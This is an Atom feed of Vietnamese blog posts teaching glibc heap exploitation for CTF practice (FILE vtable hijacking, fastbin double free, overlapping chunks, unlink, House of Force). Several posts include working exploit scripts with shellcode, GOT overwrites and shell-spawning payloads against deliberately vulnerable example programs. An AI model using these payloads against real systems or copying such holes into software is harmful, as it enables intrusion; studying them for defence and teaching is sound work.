<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Exploitation | HarDToBelieve's Blog]]></title>
  <link href="http://hardtobelieve.github.io/blog/categories/exploitation/atom.xml" rel="self"/>
  <link href="http://hardtobelieve.github.io/"/>
  <updated>2016-08-08T10:18:20+07:00</updated>
  <id>http://hardtobelieve.github.io/</id>
  <author>
    <name><![CDATA[HarDToBelieve]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[File Abusing]]></title>
    <link href="http://hardtobelieve.github.io/blog/2016/07/30/file-abusing/"/>
    <updated>2016-07-30T00:00:29+07:00</updated>
    <id>http://hardtobelieve.github.io/blog/2016/07/30/file-abusing</id>
    <content type="html"><![CDATA[<p>Tiếp tục chuyên đề về heap, nhưng lần này sẽ là một heap đặc biệt: FILE</p>

<!--more-->


<h1>Đôi điều về con trỏ FILE:</h1>

<p>Như chúng ta đã biết, trong ngôn ngữ C, muốn mở một file để thao tác trên đó ta sẽ sử dụng câu lệnh có dạng như sau:</p>

<pre><code class="c">FILE *fp = fopen("tmp", "r");
</code></pre>

<p>Đây là 1 con trỏ, mà đã là con trỏ muốn sử dụng thì sẽ luôn cần đến malloc/free để cấp phát và thu hồi bộ nhớ cho nó. Ta có thể kiểm chứng bằng cách code thử vài dòng và quan sát trong gdb:</p>

<p><img src="/assets/fileabusing/FileStructure.png" alt="File structure" /></p>

<p>Ta thấy có rất nhiều giá trị đã được gán vào vùng nhớ này, đó chính là các giá trị trong <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=libio/libio.h;h=3cf1712ea98d3c253f418feb1ef881c4a44649d5;hb=HEAD#l245">FILE STRUCTURE</a>. Nhìn thật kinh khủng !! Nhưng nói chung sẽ có 2 phần lớn đáng chú ý:</p>

<ul>
<li>Các pointer trỏ vào rất nhiều vùng nhớ như stream, flag, &hellip;</li>
<li>Danh sách địa chỉ các hàm của con trỏ ( struct _IO_jump_t* vtable )</li>
</ul>


<p><img src="/assets/fileabusing/glibc-FILE-vtable.png" alt="glibc-FILE-vtable" /></p>

<p>Như vậy khi ta gọi các hàm xử lý file ( fopen, fclose, &hellip; ), chương trình sẽ nhảy vào địa chỉ tương ứng được lưu ở đây. Câu hỏi được đặt ra là nếu ta có thể ghi đè địa chỉ ta muốn vào bảng jump đấy thì sao?</p>

<h1>Fake file pointer</h1>

<p>Mục đích của chúng ta sẽ là tạo ra một con trỏ file giả, thay đổi giá trị trỏ vào bảng các hàm xử lý để có thể gọi 1 hàm bất kỳ mà ta muốn. Thay vì trace theo từng dòng lệnh của code, ta sẽ đi theo kiểu &ldquo;lần mò&rdquo;. Cứ code và chạy thử 1 đoạn cái đã, để đơn giản, ta sẽ thêm 1 hàm <code>pwned()</code> vào chương trình :</p>

<pre><code class="c">#include &lt;stdio.h&gt;

void pwned() {
system("/bin//sh");
}

int main () {
char *a = malloc( sizeof(FILE) + sizeof(void * ) );
fclose(a);
return 0;
}
</code></pre>

<p>Và tất nhiên sẽ bị <em>Segmentation fault</em></p>

<p><img src="/assets/fileabusing/seg_1.png" alt="seg_1" /></p>

<p>Nguyên nhân gây ra lỗi này là do chương trình truy xuât vào ô nhớ <code>r8 + 0x8</code> mà <code>r8</code> lại bằng 0. Quan sát ở phía trên thì thấy <code>r8</code> nhận giá trị từ <code>rbx + 0x88</code>, trong đó rbx lại là địa chỉ heap mà ta vừa malloc. Hmm, ta thử điền bừa xem, vì dù sao nếu xem ở  ảnh ban đầu ( khi fopen với 1 con trỏ file thực sự ) thì ô nhớ <code>r8 + 0x8</code> cũng mang giá trị NULL.</p>

<pre><code class="c">char *a = malloc( sizeof(FILE) + sizeof(void * ) );
*((unsigned long long *)a + 0x88 / 8)) = a
fclose(a);
</code></pre>

<p>May quá, vậy là nó nhảy thẳng đến lệnh call</p>

<p><img src="/assets/fileabusing/seg_2.png" alt="seg_2" /></p>

<p>Lần này <em>Segmentation fault</em> cũng giống lần trước, là do chương trình truy xuất vào ô nhớ không tồn tại. <code>rax</code> đc lấy giá trị từ <code>rbx + 0xd8</code>. Vậy là rax sẽ là struct _IO_jump_t* vtable, sau đó chương trình sẽ gọi ra hàm thứ 3 trong bảng đó. OK, vậy ta sẽ cho giá trị của ô này bằng với địa chỉ của ô chứa hàm <code>pwned()</code>:</p>

<pre><code class="c">char a = malloc(sizeof(FILE) + sizeof(void ));

*((unsigned long long *)a + 0x88 / 8) = a;

*((unsigned long long *)a + 2) = &amp;pwned;
*((unsigned long long *)a + 0xd8 / 8) = a;

fclose(a);
</code></pre>

<p>Chạy thử nào:</p>

<p><img src="/assets/fileabusing/pwned.png" alt="pwned" /></p>

<p>À ha, PWNED!!!!</p>

<h1>Nhận xét</h1>

<p>Trong các kỳ thi CTF, hầu như không có chuyện đề bài cho ta fclose() một thằng vô danh nào đấy được. Nên ta thường phải kết hợp kỹ thuật này với một số kỹ thuật heap khác như <code>heap overflow</code> hay <code>user after free</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Fastbin Technique]]></title>
    <link href="http://hardtobelieve.github.io/blog/2016/06/14/fastbin/"/>
    <updated>2016-06-14T15:54:55+07:00</updated>
    <id>http://hardtobelieve.github.io/blog/2016/06/14/fastbin</id>
    <content type="html"><![CDATA[<p>Ở các bài trước, ta đã nghiên cứu 2 loại chunk đó là small chunk ( được nhắc tới ở bài <a href="blog/2016/05/15/unlink-technique">unlink</a> ) và large chunk ( sử dụng trong bài <a href="blog/2016/05/15/the-forgotten-chunk">forgotten chunk</a> ). Bài viết này sẽ đề cập đến loại chunk còn lại đó là fast chunk, có cơ chế quản lý khác hoàn toàn.</p>

<!--more-->


<h1>Đôi điều về fast chunk</h1>

<p>Chunk có kích thước từ 16 tới 80 bytes được gọi là fast chunk. Khi ta yêu cầu cấp phát kích thước nhỏ hơn 16 bytes, chương trình lấy kích thước là <a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1223">MIN SIZE</a>. Fastbin là một danh sách móc nối đơn ( single linked list ) lưu lại các fast chunk đã bị free. Trong tất cả các loại bin ( fastbin, unsorted bin, small bin, large bin ) thì fastbin có tốc độ cấp phát và giải phóng bộ nhớ nhanh nhất. Các fastbin được glibc lưu vào một mảng <a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1680">fastbinY</a>, fastbinY[i] là linked-list của các chunk có kích thước 16 * (i+1) bytes</p>

<p>Khi malloc và free một fast chunk, có một số lưu ý nhỏ sau đây</p>

<ul>
<li>Chính xác thì fastbin được dựng theo kiểu stack ( cài bằng single linked list, cơ chế thêm và xóa chunk tuân theo luật LIFO )</li>
<li>Ban đầu, fastbin rỗng nên nếu ta yêu cầu malloc fast chunk, smallbin sẽ đc dùng</li>
<li>Không có cơ chế sát nhập</li>
<li>Khi fastbin không còn rỗng nữa, glibc sẽ tính toán với hàng loạt các macro để <a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3332">tìm đúng bin</a> cần trả lại</li>
</ul>


<h1>Kịch bản ( double free )</h1>

<p>Fastbin technique về cơ bản là kỹ thuật viết đè lên trường fd của fast chunk khi ở trong fastbin để nó trỏ vào vùng nhớ ta quản lý. Để làm được điều này, ta phải có quyền viết vào vùng nhớ đã được free ( heap overflow, double free ). Ở bài viết này, ta sẽ xét lỗi double free</p>

<p>Khi free 1 fast chunk, chunk đó sẽ được đẩy vào stack ( fastbin ) nếu như chunk đó khác với chunk ở đầu stack ( thật thú vị khi glibc không kiểm tra toàn bộ fastbin mà chỉ kiểm tra head chunk, đó là vì <code>performance &gt; secruity</code> ). Như vậy, ta có thể lừa glibc bằng cách đẩy A, rồi đẩy B, rồi tiếp tục đẩy A. Để thấy được sự thú vị đó, ta chạy chương trình sau</p>

<pre><code class="c">#include &lt;stdio.h&gt;

int main () {
    char *a = (char *)malloc(8);
    char *b = (char *)malloc(8);
    char *c = (char *)malloc(8);
    free(a);
    free(b);
    free(a);
    printf ("1st malloc: %p\n", malloc(8));
    printf ("2nd malloc: %p\n", malloc(8));
    printf ("3rd malloc: %p\n", malloc(8));
    return 0;
}
</code></pre>

<p>Ta sẽ có lần malloc thứ nhất và thứ ba đều trả về cùng 1 giá trị</p>

<pre><code class="latex">1st malloc: 0x602010
2nd malloc: 0x602030
3rd malloc: 0x602010
</code></pre>

<p>Nhờ vào lỗi này, mà sau 2 lần malloc đầu, ta sẽ có chắc chắn có quyền viết vào vùng nhớ của <code>1st malloc</code>, mặc dù đó đang nằm trong fastbin. Tiếp theo, ta sẽ sửa trường fd của chunk này sao cho nó trỏ đến vùng nhớ ta quản lý. Để làm được điều này, ta sẽ phải bypass qua bước check của glibc như sau</p>

<pre><code class="c">if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))
    {
      idx = fastbin_index (nb);
      mfastbinptr *fb = &amp;fastbin (av, idx);
      mchunkptr pp = *fb;
      do
        {
          victim = pp;
          if (victim == NULL)
            break;
        }
      while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))
             != victim);
      if (victim != 0)
        {
          if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
            {
              errstr = "malloc(): memory corruption (fast)";
            errout:
              malloc_printerr (check_action, errstr, chunk2mem (victim));
              return NULL;
            }
          check_remalloced_chunk (av, victim, nb);
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
}
</code></pre>

<p>Về cơ bản, glibc chỉ check <code>fastbin_index(my_req)</code> và <code>fastbin_index(chunk_size(first_chunk_in_bin))</code> xem có bằng nhau không, nếu có thì sẽ trả lại chunk đầu tiên ở fastbin. Ta chỉ việc copy các macro mà glibc đã define bên trên, rồi chạy thì ta sẽ biết được kích thước mà ta gán có đúng hay không. Bạn đọc có thể tham khảo chương trình C <a href="https://gist.github.com/HarDToBelieve/bd9dbd40f3572c4bed09d966533fd053">sau</a> ( các bản có thể uncomment và comment tùy thuộc vào hệ điều hành và nơi bạn muốn ghi )</p>

<h1>Nhật xét</h1>

<p>Đây là một kỹ thuật khá hay, có thể kết hợp với nhiều kỹ thuật khác ( bạn đọc có thể thử kết hợp với forgotten chunk ). Tuy nhiên nhược điểm ở phương pháp này là ta cần phải biết địa chỉ ta trỏ tới, và địa chỉ đó phải có quyền ghi thì ta mới tạo được 1 chunk giả ở đó</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The Forgotten Chunk]]></title>
    <link href="http://hardtobelieve.github.io/blog/2016/05/15/the-forgotten-chunk/"/>
    <updated>2016-05-15T15:12:25+07:00</updated>
    <id>http://hardtobelieve.github.io/blog/2016/05/15/the-forgotten-chunk</id>
    <content type="html"><![CDATA[<p>Như ta đã biết, Unlink Technique là 1 công cụ rất mạnh để khai thác các lỗ hổng ở vùng nhớ heap, tuy nhiên nhược điểm khá lớn ở kỹ thuật này là ta phải viết tràn được từ heap này sang heap kia (heap overflow) hoặc free 1 vùng nhớ 2 lần (double free). Điều này sẽ gặp trở ngại nếu ta kiểm soát số lượng bytes nhập vào và kiểm tra điều kiện trước free. Bài viết này sẽ đề cập đến một kỹ thuật khác hỗ trợ khá tốt cho Unlink Technique.</p>

<!--more-->


<h1>Ý tưởng bài toán</h1>

<p>Như bài viết trước đã đề cập, khi ta free một chunk, chương trình sẽ tìm đến chunk cuối cùng của unsorted bin (danh sách các chunk đã được free trước đó), sau đó sẽ thực hiện thao tác hợp lại. Có 2 điều thú vị ta có thể nhận ra sau khi quan sát kỹ cách hoạt động của hàm free và malloc:</p>

<ul>
<li>Khi malloc 1 vùng nhớ có kích thước nhỏ hơn kích thước một vùng nhớ khác đã được free trước đó, lẽ ra hàm malloc sẽ phải update trường <code>prev_size</code> của chunk tiếp theo, tuy nhiên malloc lại &ldquo;tìm&rdquo; chunk tiếp theo bằng cách lấy <a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3619">địa chỉ chunk đã free trước đó cộng với kích thước của nó</a>.</li>
</ul>


<p>=> Nếu ta điều khiển được kích thước đó sau khi đã free thì sao?</p>

<ul>
<li>Khi free, hàm free() lẽ ra phải kiểm tra xem trường <code>prev_size</code> của chunk cần free có đúng bằng với <code>size</code> của chunk trước đó hay không, nhg ko, lại một lần nữa hàm free() lại &ldquo;tìm&rdquo; chunk trước đó để họp lại bằng cách lấy địa chỉ chunk hiện tại trừ đi <code>prev_size</code> của nó</li>
</ul>


<p>=> Có khả năng các chunk nẳm giữa 2 chunk chuẩn bị hợp lại này sẽ bị &ldquo;lãng quên&rdquo; vào cùng bị hơp vào</p>

<p>Để thấy được rõ hơn, ta sẽ đi vào kịch bản cụ thể</p>

<h1>Kịch bản ( Overlapping chunk )</h1>

<p>Giả sử ta có chương trình như sau:</p>

<pre><code class="c">//gcc -z execstack -o obo offByOne_heap.c
#include &lt;stdio.h&gt;

unsigned long long int list_addr[10];

int main () {
    list_addr[0] = (char *)malloc(0x100);
    list_addr[1] = (char *)malloc(0x200);
    list_addr[2] = (char *)malloc(0x100);
    free(list_addr[1]);
    fgets(list_addr[0], 0x109, stdin);                  // [1]
    list_addr[3] = (char *)malloc(0x100);
    list_addr[4] = (char *)malloc(0x80);

    free(list_addr[3]);                                 
    free(list_addr[2]);                                 
    list_addr[5] = (char *)malloc(0x300);

    fgets(list_addr[5], 0x300, stdin);                  // [2]
    free(list_addr[4]);
    fgets(list_addr[5], 0x300, stdin);
    fgets(list_addr[5], 0x300, stdin);
    puts("Good bye!");
    return 0;
}
</code></pre>

<p>Ta có thể thấy ở đây chương trình kiểm soát số bytes nhập vào bằng hàm fgets nên không thể thực hiện Unlink Technique ngay được. Tại [1], chương trình cho ta nhập 0x109 bytes, mặt khác lượng bytes chứa data của list_addr[0] là 0x100, vậy byte cuối cùng ( null byte do fgets thêm vào ) đã bị đè vào trường <code>size</code> của list_addr[1]. Như đã phân tích ở phần trước, trường <code>prev_size</code> của list_addr[2] sẽ không được cập nhật ở câu lệnh malloc sau đó, mà lại được cập nhật ở trước đó 10 bytes, đúng với lượng bytes đã mất của trường <code>size</code>!!</p>

<p><img src="/assets/forgotten/malloc.png" height="966" width="992" alt="" /></p>

<p>Sau đó, ta malloc 2 vùng nhớ có tổng kích thước &lt; kích thước của vùng nhớ list_addr[1] đã được free trước đó. Khi ta free list_addr[3] và free list_addr[2], hàm free sẽ nghiêm nhiên coi 2 chunk này là liền nhau và thực hiện thao tác hợp => list_addr[4] đã bị &ldquo;lãng quên&rdquo;. Bằng chứng là khi malloc list_addr[5], địa chỉ của list_addr[5] sẽ nhỏ hơn địa chỉ của list_addr[4]</p>

<p><img src="/assets/forgotten/free.png" height="966" width="992" alt="" /></p>

<p>Từ đây, ta có thể sử dụng Unlink Technique một cách dễ dàng với file exploit.py đầy đủ sau:</p>

<pre><code class="python">from hardtobelieve import *

list_addr = 0x601080
heap_addr = 0x602110
puts_got = 0x601020
block_size = 0x8

#print hex(0x602140 + len(shcode64()) + 5)

s = HarDToSock(host="192.168.37.130", port=1928)
offByone = "A"*0x108
s.send(offByone)
payload = ""
payload += "\x00" * block_size * 2
payload += p64(list_addr + 5*block_size - 3*block_size)
payload += p64(list_addr + 5*block_size - 2*block_size)
payload += shcode64() + "\x90" * 5
payload += "B" * block_size * 24
payload += p64(0x100) + p64(0x90)
s.sendln(payload)

overwrite_1 = ""
overwrite_1 += "C"*3*block_size + p64(puts_got)
s.sendln(overwrite_1)
overwrite_2 = ""
overwrite_2 += p64(heap_addr + 6*block_size) + "\n"
s.send(overwrite_2)
s.hardtopwn()
</code></pre>

<p>Và sau đó, shell là của chúng ta!!</p>

<p><img src="/assets/forgotten/exploit.png" alt="Happy hacking :D" /></p>

<h1>Nhận xét</h1>

<p>Đây là một sự hỗ trợ đắc lực cho các kỹ thuật khác và nó rất hay gặp trong các bài CTF ( khi mà hàm đọc bị lỗi và dư ra null byte ở cuối )</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Unlink Technique]]></title>
    <link href="http://hardtobelieve.github.io/blog/2016/05/15/unlink-technique/"/>
    <updated>2016-05-15T10:34:31+07:00</updated>
    <id>http://hardtobelieve.github.io/blog/2016/05/15/unlink-technique</id>
    <content type="html"><![CDATA[<p>Ở bài này, ta sẽ nghiên cứu một kỹ thuật rất mạnh dùng để khai thác lỗ hổng ở vùng nhớ heap.</p>

<!--more-->


<h1>Cấu trúc heap</h1>

<p>Glibc tổ chức 1 heap chunk như sau</p>

<pre><code class="c">struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
</code></pre>

<p>Thông thường sau khi malloc, nếu ta dump heap ra thì sẽ chỉ thấy 2 thành phần là <code>prev_size</code> và <code>size</code>. 2 thành phần chính còn lại là fd và bk sẽ xuất hiện sau khi ta free.</p>

<p><img src="/assets/unlink/heap_before_free.png" alt="Trước khi free" /></p>

<ul>
<li>Prev_size: Nếu heapchunk liền trước không đc sử dụng, trường này sẽ chứa size của heapchunk đó. Còn nếu heapchunk trước đang được sử dụng, prev_size sẽ chứa dữ liệu từ người dùng</li>
<li>size: Trường size không những thể hiện kích thước của heap, mà còn chứa thêm 3 thông tin tương ứng với 3 bit cuối cùng:

<ul>
<li>PREV_INUSE(P): Bit P bằng 1 khi chunk trước được dùng và bằng 0 khi chunk trước không được dùng</li>
<li>IS_MAPPED(M): Bit M bằng 1 khi địa chỉ của chunk được mmap</li>
<li>NON_MAIN_ARENA(N): Bit N bằng 1 khi chunk thuộc thread arena (?)</li>
</ul>
</li>
</ul>


<p><img src="/assets/unlink/heap_after_free.png" alt="Sau khi free" /></p>

<ul>
<li>Prev_size: Lúc này prev_size sẽ luôn chứa dữ liệu người dùng từ heapchunk trước đó, vì glibc không cho phép 2 chunk liên tiếp đều ở trạng thái đã bị free</li>
<li>size: Vẫn giữ nguyên khi chưa free</li>
<li>fd: Trường fd chứa địa chỉ của chunk kế tiếp trong cùng 1 bin ( Bin là 1 danh sách các chunks đã được free, sẽ được nói đến trong 1 bài riêng )</li>
<li>bk: Trường bk chứa địa chỉ của chunk liền trước trong cùng 1 bin</li>
</ul>


<h1>Unlink trong free()</h1>

<p>Thao tác unlink được glibc định nghĩa là:</p>

<pre><code class="c">#define unlink(AV, P, BK, FD) {
    FD = P-&gt;fd;
    BK = P-&gt;bk;
    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) 
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);
    else {
        FD-&gt;bk = BK;
        BK-&gt;fd = FD; 
        if (!in_smallbin_range (P-&gt;size) 
            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {
            if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)
                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))
              malloc_printerr (check_action,
                               "corrupted double-linked list (not small)",
                               P, AV);
            if (FD-&gt;fd_nextsize == NULL) {
                if (P-&gt;fd_nextsize == P)
                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;
                else {
                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;
                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize; 
                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;
                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;
                  }
              } else {
                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;
                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;
              }
          }
      }
}
</code></pre>

<p>Khi ta gọi hàm free(), về cơ bản chương trình sẽ thực hiện các thao tác sau:</p>

<ul>
<li>Kiểm tra một số điều kiện về kích thước</li>
<li>Kiểm tra liệu có chunk liền sau chunk hiện tại và size của nó chứa thông tin chỉ ra rằng chunk hiện tại đang được sử dụng</li>
<li>Kiểm tra chunk hiện tại có nằm ở đầu freelist hay không</li>
<li>Kiểm tra chunk liền trước có phải cũng đang ở trạng thái free không</li>
<li>Nếu có, thực hiện thao tác unlink chunk đó vào nhập 2 chunk làm 1</li>
<li>Nối lại chunk sau khi đã nhập làm 1 vào freelist</li>
</ul>


<p>Ta có thể thấy thao tác unlink có thể giúp ta có được quyền viết vào một vùng bất kỳ</p>

<pre><code class="c">    FD-&gt;bk = BK;
    BK-&gt;fd = FD;
</code></pre>

<p>Tuy nhiên, muốn làm được vậy, ta phải bypass qua điều kiện kiểm tra của glibc. Ta sẽ xét ví dụ cụ thể sau</p>

<h1>Kịch bản ( Heap overflow )</h1>

<p>Giả sử ta có</p>

<pre><code class="c">#include &lt;stdio.h&gt;

int list_addr[2];
int main () {
    list_addr[0] = (char *)malloc(0x80);
    list_addr[1] = (char *)malloc(0x80);
    gets(list_addr[0]);
    free(list_addr[1]);
    gets(list_addr[0]);
    gets(list_addr[0]);
    printf ("Good bye!\n");
    return 0;
}
</code></pre>

<p>Chương trình sẽ yêu cầu hàm malloc một vùng nhớ là 0x80, vì giá trị này nằm ở giữa small bin và large bin (Sẽ được nói đến trong 1 bài riêng), từ đó khi thực hiện các thao tác trong lúc free sẽ đơn giản hơn.
Dễ thấy rằng ta có thể viết đè từ chunk1 sang chunk2 nhờ hàm gets(), từ đó sau khi free chunk2, ta sẽ làm cho hàm free sát nhập chunk1 vào chunk2 mặc dù chunk1 đang ở trong trạng thái được sử dụng. Đầu tiên, hàm free() sẽ kiểm tra bit PREV_INUSE(P) của chunk2</p>

<pre><code class="c">/* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = p-&gt;prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd);
}
</code></pre>

<p>Trước khi unlink chunk1 để sát nhập, hàm free có một bước kiểm tra để khẳng định chunk liền trước và liền sau chunk1 đang trỏ vào chunk1</p>

<pre><code class="c"> if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);
</code></pre>

<p>Tuy nhiên, trước đó chương trình dùng 1 biến toàn cục để chứa địa chỉ của các heapchunk đã malloc nên ta có thể dựa vào đây để bypass qua câu lệnh if này. Ta cần lưu ý ở đây, vì khi free, chương trình sử dụng địa chỉ thực của heapchunk chứ không phải địa chỉ trả về cho người dùng, nên khi tạo các thông tin giả, ta phải tạo cách địa chỉ trả về ít nhất 2 blocks tương ứng với prev_size và size của chunk1, ta gọi là chunk11</p>

<p>Tổng kết lại, ta cần thực hiện các bước sau:</p>

<ul>
<li>Bit P của chunk2 phải được gán bằng 0 để báo với hàm free() rằng chunk11 đã được free trước đó</li>
<li>Trường fd của chunk11 sẽ chứa địa chỉ của ô nhớ cách nơi lưu địa chỉ các heapchunk 3 blocks (12 bytes)</li>
<li>Trường bk của chunk11 sẽ chứa địa chỉ của ô nhớ cách nới lưu địa chỉ các heapchunk 2 blocks (8 bytes)</li>
<li>prev_size của chunk2 phải chứa size của chunk11</li>
</ul>


<h1>Proof of concept</h1>

<p>Sau khi unlink được thì có thể có nhiều cách để khai thác tiếp: viết đè EIP, sử dụng fini_array, tls_dtor_list&hellip; Để đơn giản, bài viết sẽ khai thác bằng cách viết đè lên bảng GOT để trỏ vào nơi chứa shellcode.</p>

<pre><code class="python">from pwn import *

s = remote("localhost", 1928)

heap_addr = 0x0804b000
list_addr = 0x0804a030
puts_got = 0x0804a018
payload = ""
block_size = 4
sh = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\
\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x31\xc9\xcd\x80"

payload += "\x00"*2*block_size
payload += p32(list_addr - 3*block_size)
payload += p32(list_addr - 2*block_size)
payload += sh + "\x90"*11
payload += "\x00"*17*block_size
payload += p32(0x80)
payload += p32(0x89 &amp; ~1)
payload += "\n"
payload += "\x00"*3*block_size + p32(puts_got)
payload += "\n"
payload += p32(heap_addr + 6*block_size)
payload += "\n"

s.send(payload)
s.interactive()
</code></pre>

<p><img src="/assets/unlink/before.png" alt="Trước khi nhập payload" /></p>

<p><img src="/assets/unlink/before2.png" alt="Trước khi free" /></p>

<p><img src="/assets/unlink/after.png" alt="Sau khi free" /></p>

<ul>
<li>Ưu điểm: Có thể viết bất kỳ nơi đâu mà không làm hỏng vùng nhớ ở đó</li>
<li>Nhược điểm: Thông thường chương trình phải có nơi lưu lại địa chỉ của các heapchunk</li>
</ul>


<h1>Double free</h1>

<p>Đây là lỗi khi mà hàm free() thực hiện thao tác free đối vs 1 đối tượng 2 lần. Về cơ bản, thao tác tạo chunk giả để unlink cũng giống với heap overflow, nhưng kịch bản ở đây sẽ khác:</p>

<ul>
<li>Malloc chunk1 có kích thước 0x80</li>
<li>Malloc chunk2 có kích thước 0x80</li>
<li>Free chunk2 và chunk1</li>
<li>Malloc chunk3 có kích thước 0x100</li>
<li>Tạo chunk1 giả và chunk2 giả trong lòng chunk3</li>
<li>Free chunk2</li>
</ul>


<h1>User after free</h1>

<p>Đây là lỗi khi một vùng nhớ đã được free rồi nhưng ta vẫn có thể lưu dữ liệu ta nhập vào đó. Kịch bản tương tự với Heap overflow</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[House of Force]]></title>
    <link href="http://hardtobelieve.github.io/blog/2016/03/24/house-of-force/"/>
    <updated>2016-03-24T21:31:51+07:00</updated>
    <id>http://hardtobelieve.github.io/blog/2016/03/24/house-of-force</id>
    <content type="html"><![CDATA[<p>House of force là 1 trong 6 phương pháp được nhắc đến trong <a href="https://github.com/Malformation/Notes/blob/master/MallocMaleficarum.txt">Malloc Maleficarum</a>. Một kỹ thuật khai thác lỗ hổng ở bộ nhớ heap rất hay và vẫn được sử dụng cho đến tận bây giờ</p>

<!--more-->


<h1>Bài toán</h1>

<p>Giả sử ta có đoạn code sau:</p>

<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

// gcc HouseOfForce.c -m32 -z execstack

int main () {
    printf ("What's your name?\n");
    char *name = (char *)malloc(256);
    gets(name);      
    printf ("Hello %s\n", name);

    int n;
    printf ("Size of infos: ");
    scanf ("%d\n",&amp;n);   
    char *info = (char *)malloc(n);
    gets(info);      

    printf ("Size of wisdom: ");
    scanf ("%d\n", &amp;n);
    char *wish = (char *)malloc(n);
    gets(wish);     
    printf ("God bless you! %s", name);

    free(name);
    free(info);
    free(wish);
    return 0;
}
</code></pre>

<p>Điều kiện để ta có thể sử dụng House of Force (HoF) là cần tối thiểu 3 lần malloc:</p>

<ul>
<li>Malloc 1: Ta có thể điều khiển được topchunk ( biết địa chỉ của nó và có thể thay đổi giá trị ).</li>
<li>Malloc 2: Quản lý được size khi malloc.</li>
<li>Malloc 3: Thực hiện khai thác lỗ hổng.</li>
</ul>


<p>Trước tiên ta cần hiểu cách hoạt động của Topchunk. Đây là 1 thành phần có khả năng cấp phát bộ nhớ khi free list chunk còn trống hoặc không đủ cho yêu cầu từ người dùng. Topchunk luôn nằm sau heap sau cùng, nên ở  lần call thứ nhất, nếu ta biết đc địa chỉ heap ở lần thứ nhất này thì  chỉ việc cộng với size của nó sẽ ra đc địa chỉ size của topchunk, cộng  thêm 4 byte sẽ ra đc địa chỉ đầu tiên của vùng nhớ thuộc topchunk. Đoạn code của hàm int_malloc như sau:</p>

<pre><code class="c">static void* _int_malloc(mstate av, size_t bytes) {
    INTERNAL_SIZE_T nb;             /* normalized request size */
    mchunkptr       victim;         /* inspected/selected chunk */
    INTERNAL_SIZE_T size;           /* its size */
    mchunkptr       remainder;      /* remainder from a split */
    unsigned long   remainder_size; /* its size */

    checked_request2size(bytes, nb);

    [...]

    victim = av-&gt;top;
    size = chunksize(victim);
    if ((unsigned long)(size) &gt;= (unsigned long)(nb + MINSIZE)) {
        remainder_size = size - nb;
        remainder = chunk_at_offset(victim, nb);
        av-&gt;top = remainder;
        set_head(victim, nb | PREV_INUSE | (av!=&amp;main_arena ? NON_MAIN_ARENA : 0));

        set_head(remainder, remainder_size | PREV_INUSE);

        check_malloced_chunk(av, victim, nb);
        void *p = chunk2mem(victim);
        if (__builtin_expect (perturb_byte, 0))
            alloc_perturb (p, bytes);
        return p;
    }

    [...]
}
</code></pre>

<p>Để có thể sử dụng được topchunk, kích thước của nó phải lớn hơn kích thước mà người dùng yêu cầu. Sau đó, topchunk sẽ bị giảm đi một lượng bằng đúng kích thước người dùng yêu cầu và topchunk sẽ được đặt ở</p>

<pre><code class="latex">&lt;địa chỉ topchunk cũ&gt; + kích thước 
</code></pre>

<p>Ta có thể thấy vì địa chỉ topchunk là một số nguyên 4 byte, vậy nếu ta cộng một lượng mà kết quả vượt quá MAX_INT thì địa chỉ sẽ bị quay vòng lại ( 2&rsquo;s complement ). Như vậy, ta có thể điều khiển được giá trị trả về của hàm malloc ở lần sau.</p>

<p>Khai thác
Đầu tiên, ta sẽ lấp đầy bộ nhớ vừa được phát và sau đó, để đơn đơn giản ta sẽ đặt kích thước của topchunk là 0xffffffff.  Ngoài ra khi ta malloc(n) thì chương trình sẽ trả lại một vùng nhớ có độ lớn là ((n + 4 + 7) &amp; ~7)để chứa metadata của heap + data của người dùng, ta có thể dùng công thức này để tính toán vị trí của topchunk</p>

<p><img src="/assets/hof/hof1.png" alt="Heap memory" /></p>

